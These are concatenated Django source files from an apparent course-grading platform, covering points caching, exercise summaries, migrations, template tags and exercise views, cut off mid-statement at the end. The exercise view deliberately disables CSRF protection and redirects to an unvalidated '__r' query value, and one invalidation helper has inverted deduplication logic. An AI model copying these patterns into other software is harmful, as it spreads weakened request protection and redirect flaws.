            passed = r_collect(module, None, module['children'])
            module['passed'] = (
                passed
                and module['points'] >= module['points_to_pass']
            )
        for category in categories.values():
            category['passed'] = (
                category['points'] >= category['points_to_pass']
            )

        data['points_created'] = timezone.now()
        return data

    def created(self):
        return self.data['points_created'], super().created()

    def submission_ids(self, number=None, category_id=None, module_id=None,
                       exercise_id=None, filter_for_assistant=False, best=True):
        exercises = self.search_exercises(
            number=number,
            category_id=category_id,
            module_id=module_id,
            exercise_id=exercise_id,
            filter_for_assistant=filter_for_assistant,
        )
        submissions = []
        if best:
            for entry in exercises:
                sid = entry.get('best_submission', None)
                if not sid is None:
                    submissions.append(sid)
        else:
            for entry in exercises:
                submissions.extend(s['id'] for s in entry.get('submissions', []))
        return submissions


def invalidate_content(sender, instance, **kwargs):
    course = instance.exercise.course_instance
    for profile in instance.submitters.all():
        CachedPoints.invalidate(course, profile.user)

def invalidate_content_m2m(sender, instance, action, reverse, model, pk_set, **kwargs):
    # many-to-many field Submission.submitters may be modified without
    # triggering the Submission post save hook
    if action not in ('post_add', 'pre_remove'):
        return
    if reverse:
        # instance is a UserProfile
        if model == Submission:
            seen_courses = set()
            for submission_pk in pk_set:
                try:
                    submission = Submission.objects.get(pk=submission_pk)
                    course_instance = submission.exercise.course_instance
                    if course_instance.pk not in seen_courses:
                        CachedPoints.invalidate(course_instance, instance.user)
                    else:
                        seen_courses.add(course_instance.pk)
                except Submission.DoesNotExist:
                    pass
    else:
        # instance is a Submission
        invalidate_content(Submission, instance)

def invalidate_notification(sender, instance, **kwargs):
    course = instance.course_instance
    if not course and instance.submission:
        course = instance.submission.exercise.course_instance
    CachedPoints.invalidate(course, instance.recipient.user)


# Automatically invalidate cached points when submissions change.
post_save.connect(invalidate_content, sender=Submission)
post_delete.connect(invalidate_content, sender=Submission)
post_save.connect(invalidate_notification, sender=Notification)
post_delete.connect(invalidate_notification, sender=Notification)
# listen to the m2m_changed signal since submission.submitters is a many-to-many
# field and instances must be saved before the many-to-many fields may be modified,
# that is to say, the submission post save hook may see an empty submitters list
m2m_changed.connect(invalidate_content_m2m, sender=Submission.submitters.through)

import itertools

from django.core.exceptions import ObjectDoesNotExist
from django.db.models import Max

from course.models import StudentGroup
from .cache.content import CachedContent
from .models import BaseExercise, Submission


class UserExerciseSummary(object):
    """
    UserExerciseSummary summarises the submissions of a certain user and
    exercise. It calculates some characterizing figures such as the number of
    submissions and reference to the best submission. See the public methods
    for more.
    """
    def __init__(self, exercise, user=None):
        self.exercise = exercise
        self.max_points = getattr(exercise, 'max_points', 0)
        self.difficulty = getattr(exercise, 'difficulty', '')
        self.points_to_pass = getattr(exercise, 'points_to_pass', 0)
        self.user = user
        self.submissions = []
        self.submission_count = 0
        self.best_submission = None
        self.graded = False
        self.unofficial = False

        if self.user and self.user.is_authenticated():                    
            self.submissions = list(exercise.get_submissions_for_student(
                user.userprofile))
            for s in self.submissions:
                if not s.status in (
                    Submission.STATUS.ERROR,
                    Submission.STATUS.REJECTED,
                ):
                    self.submission_count += 1
                    if (
                        s.status == Submission.STATUS.READY and (
                            self.best_submission is None
                            or self.unofficial
                            or s.grade > self.best_submission.grade
                        )
                    ):
                        self.best_submission = s
                        self.unofficial = False
                        self.graded = True
                    elif (
                        s.status == Submission.STATUS.UNOFFICIAL and (
                            not self.graded
                            or (
                                self.unofficial
                                and s.grade > self.best_submission.grade
                            )
                        )
                    ):
                        self.best_submission = s
                        self.unofficial = True

    def get_submission_count(self):
        return self.submission_count

    def get_submissions(self):
        return self.submissions

    def get_best_submission(self):
        return self.best_submission

    def get_points(self):
        return self.best_submission.grade if self.best_submission and not self.unofficial else 0

    def get_penalty(self):
        return self.best_submission.late_penalty_applied if self.best_submission else None

    def is_missing_points(self):
        return self.get_points() < self.points_to_pass

    def is_full_points(self):
        return self.get_points() >= self.max_points

    def is_passed(self):
        return not self.is_missing_points()

    def is_submitted(self):
        return self.submission_count > 0

    def is_graded(self):
        return self.graded

    def is_unofficial(self):
        return self.unofficial

    def get_group(self):
        if self.submission_count > 0:
            s = self.submissions[0]
            if s.submitters.count() > 0:
                return StudentGroup.get_exact(
                    self.exercise.course_instance,
                    s.submitters.all()
                )
        return None

    def get_group_id(self):
        group = self.get_group()
        return group.id if group else 0


class ResultTable:
    """
    WARNING: Constructing this class is a heavy database operation.

    Models the table displaying the grades for each student on each exercise.
    Result tables are generated dynamically when needed and not stored
    in a database.
    """

    def __init__(self, course_instance):
        """
        Instantiates a new ResultTable for the given course instance.
        After initialization the table is filled with grades from the database.
        """
        self.course_instance = course_instance

        # Exercises on the course.
        self.exercises = list(self.__get_exercises())
        self.categories = course_instance.categories.all()

        # Students on the course.
        self.students = list(course_instance.get_student_profiles())

        # Empty results table.
        self.results = {
            student.id: {
                exercise.id: None for exercise in self.exercises
            } for student in self.students
        }
        self.results_by_category = {
            student.id: {
                category.id: 0 for category in self.categories
            } for student in self.students
        }

        # Fill the results with the data from the database.
        self.__collect_student_grades()


    def __get_exercises(self):
        content = CachedContent(self.course_instance)

        def get_descendant_ids(node):
            children = node['children']
            if children:
                return itertools.chain.from_iterable(
                    [get_descendant_ids(child) for child in children])
            return (node['id'],)

        root_node = { 'children': content.modules() }
        ids = get_descendant_ids(root_node)

        # Loop until end of ids raises StopIteration
        while True:
            id = next(ids)
            try:
                yield BaseExercise.objects.get(learningobject_ptr_id=id)
            except ObjectDoesNotExist:
                continue


    def __collect_student_grades(self):
        """
        Helper for the __init__.
        This method puts the data from the database in to the results table.
        """
        submissions = list(Submission.objects \
            .filter(
                exercise__course_module__course_instance=self.course_instance,
                status=Submission.STATUS.READY
            ).values("submitters", "exercise", "exercise__category") \
            .annotate(best=Max("grade")) \
            .order_by()) # Remove default ordering.
        for submission in submissions:
            student_id = submission["submitters"]
            if student_id in self.results:
                self.results[student_id][submission["exercise"]] = submission["best"]
                self.results_by_category[student_id][submission["exercise__category"]] += submission["best"]


    def results_for_template(self):
        """
        Converts the results data into a form that is convenient for to use in a
        template. The columns of the table ordered according to the order of the
        exercises in self.exercises.
        """
        for_template = []
        for student in self.students:
            grades = [ self.results[student.id][exercise.id] \
                for exercise in self.exercises ]
            total = sum(g for g in grades if g is not None)
            for_template.append((student, grades, total))
        return for_template


    def max_sum(self):
        return sum(e.max_points for e in self.exercises)

# -*- coding: utf-8 -*-


from django.db import models, migrations
from django.utils import timezone
import datetime
import exercise.submission_models
import lib.helpers
import exercise.exercise_models
import lib.fields


class Migration(migrations.Migration):

    dependencies = [
        ('inheritance', '0001_initial'),
        ('userprofile', '0001_initial'),
        ('course', '0001_initial'),
    ]

    operations = [
        migrations.CreateModel(
            name='CourseModule',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('name', models.CharField(max_length=255)),
                ('points_to_pass', models.PositiveIntegerField(default=0)),
                ('introduction', models.TextField(blank=True)),
                ('opening_time', models.DateTimeField(default=timezone.now)),
                ('closing_time', models.DateTimeField(default=timezone.now)),
                ('late_submissions_allowed', models.BooleanField(default=False)),
                ('late_submission_deadline', models.DateTimeField(default=timezone.now)),
                ('late_submission_penalty', lib.fields.PercentField(default=0.5, help_text='Multiplier of points to reduce, as decimal. 0.1 = 10%')),
                ('course_instance', models.ForeignKey(related_name='course_modules', to='course.CourseInstance')),                    
            ],
            options={
                'ordering': ['closing_time', 'id'],
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='DeadlineRuleDeviation',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('extra_minutes', models.IntegerField()),
            ],
            options={
                'abstract': False,
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='LearningObject',
            fields=[
                ('modelwithinheritance_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='inheritance.ModelWithInheritance')),                    
                ('order', models.IntegerField(default=0)),
                ('name', models.CharField(max_length=255)),
                ('description', models.TextField(blank=True)),
                ('instructions', models.TextField(blank=True)),
                ('service_url', models.URLField(blank=True)),
            ],
            options={
            },
            bases=('inheritance.modelwithinheritance',),
        ),
        migrations.CreateModel(
            name='BaseExercise',
            fields=[
                ('learningobject_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='exercise.LearningObject')),                    
                ('allow_assistant_grading', models.BooleanField(default=False)),
                ('min_group_size', models.PositiveIntegerField(default=1)),
                ('max_group_size', models.PositiveIntegerField(default=1)),
                ('max_submissions', models.PositiveIntegerField(default=10)),
                ('max_points', models.PositiveIntegerField(default=100)),
                ('points_to_pass', models.PositiveIntegerField(default=40)),
            ],
            options={
                'ordering': ['course_module__closing_time', 'course_module', 'order', 'id'],
            },
            bases=('exercise.learningobject',),
        ),
        migrations.CreateModel(
            name='ExerciseWithAttachment',
            fields=[
                ('baseexercise_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='exercise.BaseExercise')),                    
                ('files_to_submit', models.CharField(help_text='File names that user should submit, use pipe character to separate files', max_length=200, blank=True)),
                ('attachment', models.FileField(upload_to=exercise.exercise_models.build_upload_dir)),
            ],
            options={
                'verbose_name_plural': 'exercises with attachment',
            },
            bases=('exercise.baseexercise',),
        ),
        migrations.CreateModel(
            name='AsynchronousExercise',
            fields=[
                ('baseexercise_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='exercise.BaseExercise')),                    
            ],
            options={
            },
            bases=('exercise.baseexercise',),
        ),
        migrations.CreateModel(
            name='LearningObjectCategory',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('name', models.CharField(max_length=35)),
                ('description', models.TextField(blank=True)),
                ('points_to_pass', models.PositiveIntegerField(default=0)),
                ('course_instance', models.ForeignKey(related_name='categories', to='course.CourseInstance')),                    
                ('hidden_to', models.ManyToManyField(related_name='hidden_categories', null=True, to='userprofile.UserProfile', blank=True)),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='MaxSubmissionsRuleDeviation',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('extra_submissions', models.IntegerField()),
            ],
            options={
                'abstract': False,
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='StaticExercise',
            fields=[
                ('baseexercise_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='exercise.BaseExercise')),                    
                ('exercise_page_content', models.TextField()),
                ('submission_page_content', models.TextField()),
            ],
            options={
            },
            bases=('exercise.baseexercise',),
        ),
        migrations.CreateModel(
            name='Submission',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('submission_time', models.DateTimeField(auto_now_add=True)),
                ('hash', models.CharField(default=lib.helpers.get_random_string, max_length=32)),
                ('feedback', models.TextField(blank=True)),
                ('assistant_feedback', models.TextField(blank=True)),
                ('status', models.CharField(default=b'initialized', max_length=32, choices=[(b'initialized', 'Initialized'), (b'waiting', 'Waiting'), (b'ready', 'Ready'), (b'error', 'Error')])),
                ('grade', models.IntegerField(default=0)),
                ('grading_time', models.DateTimeField(null=True, blank=True)),
                ('service_points', models.IntegerField(default=0)),
                ('service_max_points', models.IntegerField(default=0)),
                ('submission_data', lib.fields.JSONField(blank=True)),
                ('grading_data', lib.fields.JSONField(blank=True)),
            ],
            options={
                'ordering': ['-submission_time'],
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='SubmittedFile',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('param_name', models.CharField(max_length=128)),
                ('file_object', models.FileField(max_length=255, upload_to=exercise.submission_models.build_upload_dir)),
                ('submission', models.ForeignKey(related_name='files', to='exercise.Submission')),                    
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='SynchronousExercise',
            fields=[
                ('baseexercise_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='exercise.BaseExercise')),                    
            ],
            options={
            },
            bases=('exercise.baseexercise',),
        ),
        migrations.AddField(
            model_name='submission',
            name='exercise',
            field=models.ForeignKey(related_name='submissions', to='exercise.BaseExercise'),                    
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='submission',
            name='grader',
            field=models.ForeignKey(related_name='graded_submissions', blank=True, to='userprofile.UserProfile', null=True),                    
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='submission',
            name='submitters',
            field=models.ManyToManyField(related_name='submissions', to='userprofile.UserProfile'),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='maxsubmissionsruledeviation',
            name='exercise',
            field=models.ForeignKey(related_name='maxsubmissionsruledeviations', to='exercise.BaseExercise'),                    
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='maxsubmissionsruledeviation',
            name='submitter',
            field=models.ForeignKey(to='userprofile.UserProfile'),                    
            preserve_default=True,
        ),
        migrations.AlterUniqueTogether(
            name='maxsubmissionsruledeviation',
            unique_together=set([('exercise', 'submitter')]),
        ),
        migrations.AlterUniqueTogether(
            name='learningobjectcategory',
            unique_together=set([('name', 'course_instance')]),
        ),
        migrations.AddField(
            model_name='learningobject',
            name='category',
            field=models.ForeignKey(related_name='learning_objects', to='exercise.LearningObjectCategory'),                    
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='learningobject',
            name='course_module',
            field=models.ForeignKey(related_name='learning_objects', to='exercise.CourseModule'),                    
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='deadlineruledeviation',
            name='exercise',
            field=models.ForeignKey(related_name='deadlineruledeviations', to='exercise.BaseExercise'),                    
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='deadlineruledeviation',
            name='submitter',
            field=models.ForeignKey(to='userprofile.UserProfile'),                    
            preserve_default=True,
        ),
        migrations.AlterUniqueTogether(
            name='deadlineruledeviation',
            unique_together=set([('exercise', 'submitter')]),
        ),
    ]

# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations
import django.utils.timezone


class Migration(migrations.Migration):

    dependencies = [
        ('exercise', '0004_auto_20150617_1033'),
    ]

    operations = [
        migrations.AlterField(
            model_name='coursemodule',
            name='closing_time',
            field=models.DateTimeField(default=django.utils.timezone.now),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='coursemodule',
            name='late_submission_deadline',
            field=models.DateTimeField(default=django.utils.timezone.now),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='coursemodule',
            name='opening_time',
            field=models.DateTimeField(default=django.utils.timezone.now),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='deadlineruledeviation',
            name='exercise',
            field=models.ForeignKey(to='exercise.BaseExercise'),                    
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='maxsubmissionsruledeviation',
            name='exercise',
            field=models.ForeignKey(to='exercise.BaseExercise'),                    
            preserve_default=True,
        ),
    ]

# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('exercise', '0006_auto_20150625_1823'),
        ('course', '0005_auto_20150625_1835'),
        ('deviations', '0001_initial')
    ]

    operations = [
        migrations.AlterField(
            model_name='learningobject',
            name='category',
            field=models.ForeignKey(related_name='learning_objects', to='course.LearningObjectCategory'),                    
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='learningobject',
            name='course_module',
            field=models.ForeignKey(related_name='learning_objects', to='course.CourseModule'),                    
            preserve_default=True,
        ),
    ]

# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations
import django.core.validators


class Migration(migrations.Migration):

    dependencies = [
        ('exercise', '0010_auto_20151214_1714'),
    ]

    operations = [
        migrations.CreateModel(
            name='CourseChapter',
            fields=[
                ('learningobject_ptr', models.OneToOneField(parent_link=True, primary_key=True, to='exercise.LearningObject', serialize=False, auto_created=True)),                    
                ('generate_table_of_contents', models.BooleanField(default=False)),
            ],
            options={
            },
            bases=('exercise.learningobject',),
        ),
        migrations.AddField(
            model_name='learningobject',
            name='content_head',
            field=models.TextField(blank=True),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='learningobject',
            name='parent',
            field=models.ForeignKey(related_name='children', null=True, to='exercise.LearningObject', blank=True),                    
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='learningobject',
            name='status',
            field=models.CharField(choices=[('ready', 'Ready'), ('hidden', 'Hidden'), ('maintenance', 'Maintenance')], max_length=32, default='ready'),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='learningobject',
            name='url',
            field=models.CharField(max_length=255, help_text='Input an URL identifier for this object.', validators=[django.core.validators.RegexValidator(regex='^[\\w\\-\\.]*$')],
            blank=True, null=True, default=None),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='learningobject',
            name='use_wide_column',
            field=models.BooleanField(help_text='Remove the third info column for more space.', default=False),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='learningobject',
            name='description',
            field=models.TextField(help_text='Internal description is not presented on site.', blank=True),
            preserve_default=True,
        ),
    ]

# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('external_services', '0004_auto_20150828_1210'),
        ('exercise', '0013_auto_20151222_1320'),
    ]

    operations = [
        migrations.CreateModel(
            name='LTIExercise',
            fields=[
                ('baseexercise_ptr', models.OneToOneField(auto_created=True, primary_key=True, serialize=False, parent_link=True, to='exercise.BaseExercise')),                    
                ('lti_service', models.ForeignKey(to='external_services.LTIService')),                    
            ],
            options={
            },
            bases=('exercise.baseexercise',),
        ),
    ]

# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('userprofile', '0002_auto_20150427_1717'),
        ('exercise', '0014_ltiexercise'),
    ]

    operations = [
        migrations.CreateModel(
            name='LearningObjectDisplay',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('timestamp', models.DateTimeField(auto_now_add=True)),
                ('learning_object', models.ForeignKey(to='exercise.LearningObject')),                    
                ('profile', models.ForeignKey(to='userprofile.UserProfile')),                    
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.AlterField(
            model_name='learningobject',
            name='status',
            field=models.CharField(choices=[('ready', 'Ready'), ('unlisted', 'Unlisted in table of contents'), ('enrollment', 'Enrollment questions'), ('hidden', 'Hidden from non course staff'), ('maintenance', 'Maintenance')], max_length=32, default='ready'),
            preserve_default=True,
        ),
    ]

import json
from django import template
from django.db.models import Max, Min
from django.template.loader import render_to_string
from django.utils import timezone
from django.utils.translation import ugettext_lazy as _

from course.models import CourseModule
from lib.errors import TagUsageError
from ..cache.content import CachedContent
from ..cache.points import CachedPoints
from ..exercise_summary import UserExerciseSummary
from ..models import LearningObjectDisplay, LearningObject, Submission, BaseExercise


register = template.Library()


def _prepare_now(context):
    if not 'now' in context:
        context['now'] = timezone.now()
    return context['now']


def _prepare_context(context, student=None):
    if not 'instance' in context:
        raise TagUsageError()
    instance = context['instance']
    _prepare_now(context)
    if not 'content' in context:
        context['content'] = CachedContent(instance)
    def points(user, key):
        if not key in context:
            context[key] = CachedPoints(instance, user, context['content'])
        return context[key]
    if student:
        return points(student, 'studentpoints')
    return points(context['request'].user, 'points')


def _get_toc(context, student=None):
    points = _prepare_context(context, student)
    context = context.flatten()
    context.update({
        'modules': points.modules_flatted(),
        'categories': points.categories(),
        'total': points.total(),
        'is_course_staff': context.get('is_course_staff', False),
    })
    return context


@register.inclusion_tag("exercise/_user_results.html", takes_context=True)
def user_results(context, student=None):
    values = _get_toc(context, student)
    values['total_json'] = json.dumps(values['total'])
    if student:
        values['is_course_staff'] = False
    return values


@register.inclusion_tag("exercise/_user_toc.html", takes_context=True)
def user_toc(context, student=None):
    return _get_toc(context, student)


@register.inclusion_tag("exercise/_user_last.html", takes_context=True)
def user_last(context):
    user = context['request'].user
    points = _prepare_context(context)
    if user.is_authenticated():                    
        last = LearningObjectDisplay.objects.filter(
            profile=user.userprofile,
            learning_object__status=LearningObject.STATUS.READY,
            learning_object__course_module__course_instance=context['instance'],
        ).select_related('learning_object').order_by('-timestamp').first()
        if last:
            entry,_,_,_ = points.find(last.learning_object)
            return {
                'last': entry,
                'last_time': last.timestamp,
            }
    return {
        'begin': points.begin(),
        'instance': context['instance'],
    }


@register.inclusion_tag("exercise/_category_points.html", takes_context=True)
def category_points(context, student=None):
    return _get_toc(context, student)


@register.inclusion_tag("exercise/_submission_list.html", takes_context=True)
def latest_submissions(context):
    submissions = context["profile"].submissions \
        .filter(exercise__course_module__course_instance=context["instance"]) \
        .order_by("-id")[:10]
    return {
        "submissions": submissions,
        "title": _("Latest submissions"),
        "empty": _("No submissions for this course."),
    }


@register.filter
def max_submissions(exercise, user_profile):
    return exercise.max_submissions_for_student(user_profile)


@register.filter
def percent(decimal):
    return int(decimal * 100)


@register.filter
def submission_status(status):
    return Submission.STATUS[status]


def _points_data(obj, classes=None):
    if isinstance(obj, UserExerciseSummary):
        exercise = obj.exercise
        data = {
            'points': obj.get_points(),
            'max': exercise.max_points,
            'difficulty': exercise.difficulty,
            'required': exercise.points_to_pass,
            'confirm_the_level': exercise.category.confirm_the_level,
            'missing_points': obj.is_missing_points(),
            'passed': obj.is_passed(),
            'full_score': obj.is_full_points(),
            'submitted': obj.is_submitted(),
            'graded': obj.is_graded(),
            'official': not obj.is_unofficial(),
            'exercise_page': True,
        }
    elif isinstance(obj, Submission):
        exercise = obj.exercise
        data = {
            'points': obj.grade,
            'max': exercise.max_points,
            'difficulty': exercise.difficulty,
            'required': exercise.points_to_pass,
            'confirm_the_level': exercise.category.confirm_the_level,
            'missing_points': obj.grade < exercise.points_to_pass,
            'passed': obj.grade >= exercise.points_to_pass,
            'full_score': obj.grade >= exercise.max_points,
            'submitted': True,
            'graded': obj.is_graded,
            'official': obj.status != Submission.STATUS.UNOFFICIAL,
        }
        if not obj.is_graded and (
                    not exercise.category.confirm_the_level
                    or obj.status != Submission.STATUS.WAITING
                ):
            data['status'] = obj.status
    else:
        points = obj.get('points', 0)
        max_points = obj.get('max_points', 0)
        required = obj.get('points_to_pass', 0)
        data = {
            'points': points,
            'max': max_points,
            'difficulty': obj.get('difficulty', ''),
            'required': required,
            'confirm_the_level': obj.get('confirm_the_level', False),
            'missing_points': points < required,
            'passed': obj.get('passed', True),
            'full_score': points >= max_points,
            'submitted': obj.get('submission_count', 0) > 0,
            'graded': obj.get('graded', True),
            'status': obj.get('submission_status', False),
            'unconfirmed': obj.get('unconfirmed', False),
            'official': not obj.get('unofficial', False),
            'confirmable_points': obj.get('confirmable_points', False),
        }
    percentage = 0
    required_percentage = None
    if data['max'] > 0:
        percentage = int(round(100.0 * data['points'] / data['max']))
        if data['required']:
            required_percentage = int(round(100.0 * data['required'] / data['max']))
    data.update({
        'classes': classes,
        'percentage': percentage,
        'required_percentage': required_percentage,
    })
    return data


@register.inclusion_tag("exercise/_points_progress.html")
def points_progress(obj):
    return _points_data(obj)


@register.inclusion_tag("exercise/_points_badge.html")
def points_badge(obj, classes=None):
    return _points_data(obj, classes)


@register.assignment_tag(takes_context=True)
def max_group_size(context):
    points = _prepare_context(context)
    return points.total()['max_group_size']


@register.assignment_tag(takes_context=True)
def min_group_size(context):
    points = _prepare_context(context)
    return points.total()['min_group_size']


@register.assignment_tag(takes_context=True)
def module_accessible(context, entry):
    t = entry.get('opening_time')
    if t and t > _prepare_now(context):
        return False
    if entry.get('requirements'):
        points = _prepare_context(context)
        module = CourseModule.objects.get(id=entry['id'])
        return module.are_requirements_passed(points)
    return True


@register.assignment_tag
def get_grading_errors(submission):
    if not isinstance(submission.grading_data, dict):
        return ""
    grading_data = submission.grading_data.get('grading_data')
    if not isinstance(grading_data, str):
        return ""
    if grading_data.startswith('<pre>'):
        return grading_data[5:-6]
    try:
        return json.loads(grading_data).get('errors', "")
    except (AttributeError, TypeError, ValueError):
        return ""


@register.inclusion_tag("exercise/_text_stats.html", takes_context=True)
def exercise_text_stats(context, exercise):
    if not 'instance' in context:
        raise TagUsageError()
    instance = context['instance']

    if not 'student_count' in context:
        context['student_count'] = instance.students.count()
    total = context['student_count']

    if isinstance(exercise, int):
        num = instance.students.filter(submissions__exercise_id=exercise).distinct().count()
    else:
        num = exercise.number_of_submitters() if exercise else 0
    return {
        "number": num,
        "percentage": int(100 * num / total) if total else 0,
    }

@register.simple_tag
def get_format_info(format):
    format_infos = {
        'json' : {
            'name': 'json',
            'verbose_name': 'JSON',
        },
        'csv': {
            'name': 'csv',
            'verbose_name': 'CSV',
        },
        'excel.csv': {
            'name': 'excel.csv',
            'verbose_name': _('Excel compatible CSV'),
        },
    }
    try:
        return format_infos[format]
    except KeyError as e:
        raise RuntimeError('Invalid format: \'{}\''.format(format)) from e

@register.simple_tag
def get_format_info_list(formats):
    return [get_format_info(format) for format in formats.split()]

from django.conf import settings
from django.contrib import messages
from django.core.exceptions import MultipleObjectsReturned, PermissionDenied
from django.http.response import Http404, HttpResponse
from django.shortcuts import get_object_or_404
from django.utils.decorators import method_decorator
from django.utils.translation import ugettext_lazy as _
from django.views.decorators.clickjacking import xframe_options_exempt
from django.views.decorators.csrf import csrf_exempt
from django.views.static import serve

from authorization.permissions import ACCESS
from course.models import CourseModule
from course.viewbase import CourseInstanceBaseView, EnrollableViewMixin
from lib.remote_page import RemotePageNotFound, request_for_response
from lib.viewbase import BaseRedirectMixin, BaseView
from .models import LearningObject, LearningObjectDisplay
from .protocol.exercise_page import ExercisePage
from .submission_models import SubmittedFile, Submission
from .viewbase import ExerciseBaseView, SubmissionBaseView, SubmissionMixin, ExerciseModelBaseView, ExerciseTemplateBaseView

from .exercisecollection_models import ExerciseCollection
from .exercise_summary import UserExerciseSummary
from django.urls import reverse


class TableOfContentsView(CourseInstanceBaseView):
    template_name = "exercise/toc.html"


class ResultsView(TableOfContentsView):
    template_name = "exercise/results.html"


class ExerciseInfoView(ExerciseBaseView):
    ajax_template_name = "exercise/_exercise_info.html"

    def get_common_objects(self):
        super().get_common_objects()
        self.get_summary_submissions()


class ExerciseView(BaseRedirectMixin, ExerciseBaseView, EnrollableViewMixin):
    template_name = "exercise/exercise.html"
    ajax_template_name = "exercise/exercise_plain.html"
    post_url_name = "exercise"
    access_mode = ACCESS.STUDENT

    # Allow form posts without the cross-site-request-forgery key.
    @method_decorator(csrf_exempt)
    def dispatch(self, request, *args, **kwargs):
        return super().dispatch(request, *args, **kwargs)

    def get_access_mode(self):
        access_mode = super().get_access_mode()

        # Loosen the access mode if exercise is enrollment
        if (self.exercise.status in (
                LearningObject.STATUS.ENROLLMENT,
                LearningObject.STATUS.ENROLLMENT_EXTERNAL,
              ) and access_mode == ACCESS.STUDENT):
            access_mode = ACCESS.ENROLL

        return access_mode

    def get(self, request, *args, **kwargs):
        exercisecollection = None
        exercisecollection_title = None
        submission_allowed = False
        disable_submit = False
        should_enroll = False
        issues = []
        students = [self.profile]

        if self.exercise.is_submittable:
            SUBMIT_STATUS = self.exercise.SUBMIT_STATUS
            submission_status, submission_allowed, issues, students = self.submission_check()
            self.get_summary_submissions()
            disable_submit = submission_status in [
                SUBMIT_STATUS.CANNOT_ENROLL,
                SUBMIT_STATUS.NOT_ENROLLED,
            ]
            should_enroll = submission_status == SUBMIT_STATUS.NOT_ENROLLED

        if (self.exercise.status == LearningObject.STATUS.MAINTENANCE
              or self.module.status == CourseModule.STATUS.MAINTENANCE):
            if self.is_course_staff:
                issue = _("Exercise is in maintenance and content is hidden "
                          "from students.")
                messages.error(request, issue)
                issues.append(issue)
            else:
                page = ExercisePage(self.exercise)
                page.content = _('Unfortunately this exercise is currently '
                                 'under maintenance.')
                return super().get(request, *args, page=page, students=students, **kwargs)

        if hasattr(self.exercise, 'generate_table_of_contents') \
              and self.exercise.generate_table_of_contents:
            self.toc = self.content.children_hierarchy(self.exercise)
            self.note("toc")

        page = self.exercise.as_leaf_class().load(request, students,
            url_name=self.post_url_name)

        if self.profile:
            LearningObjectDisplay.objects.create(learning_object=self.exercise, profile=self.profile)

        if isinstance(self.exercise, ExerciseCollection):
            exercisecollection, exercisecollection_title = self.__load_exercisecollection(request)

        return super().get(request,
                           *args,
                           page=page,
                           students=students,
                           submission_allowed=submission_allowed,
                           disable_submit=disable_submit,
                           should_enroll=should_enroll,
                           issues=issues,
                           exercisecollection=exercisecollection,
                           exercisecollection_title=exercisecollection_title,
                           **kwargs)

    def post(self, request, *args, **kwargs):
        # Stop submit trials for e.g. chapters.
        # However, allow posts from exercises switched to maintenance status.
        if not self.exercise.is_submittable:
            return self.http_method_not_allowed(request, *args, **kwargs)

        new_submission = None
        page = ExercisePage(self.exercise)
        submission_status, submission_allowed, issues, students = (
            self.submission_check(True, request)
        )
        if submission_allowed:
            new_submission = Submission.objects.create_from_post(
                self.exercise, students, request)
            if new_submission:
                page = self.exercise.grade(request, new_submission,
                    url_name=self.post_url_name)

                # Enroll after succesfull enrollment exercise.
                if self.exercise.status in (
                    LearningObject.STATUS.ENROLLMENT,
                    LearningObject.STATUS.ENROLLMENT_EXTERNAL,
                ) and new_submission.status == Submission.STATUS.READY:
                    self.instance.enroll_student(self.request.user)

                # Redirect non AJAX normally to submission page.
                if not request.is_ajax() and "__r" not in request.GET:
                    return self.redirect(new_submission.get_absolute_url() +
                        ("?wait=1" if page.is_wait else ""))
            else:
                messages.error(request,
                    _("The submission could not be saved for some reason. "
                      "The submission was not registered."))

            # Redirect non AJAX content page request back.
            if not request.is_ajax() and "__r" in request.GET:
                return self.redirect(request.GET["__r"], backup=self.exercise);

        self.get_summary_submissions()
        return self.response(page=page, students=students,
